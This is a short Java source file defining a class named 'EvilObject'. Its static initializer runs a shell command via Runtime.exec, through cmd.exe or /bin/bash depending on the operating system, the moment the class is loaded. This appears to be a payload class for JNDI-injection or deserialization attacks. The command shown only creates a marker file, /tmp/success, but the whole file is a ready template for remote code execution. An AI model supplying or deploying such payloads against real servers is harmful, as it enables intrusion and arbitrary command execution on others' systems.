import java.lang.Runtime;

public class EvilObject extends Thread{
    private static Thread thread = new EvilObject();
    private static String cmd = "touch /tmp/success";

    static
    {
        try{
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c",cmd}
                    : new String[]{"/bin/bash","-c",cmd};
            Runtime.getRuntime().exec(cmds);
        }
        catch(Exception e){
            e.printStackTrace();
        }

    }
}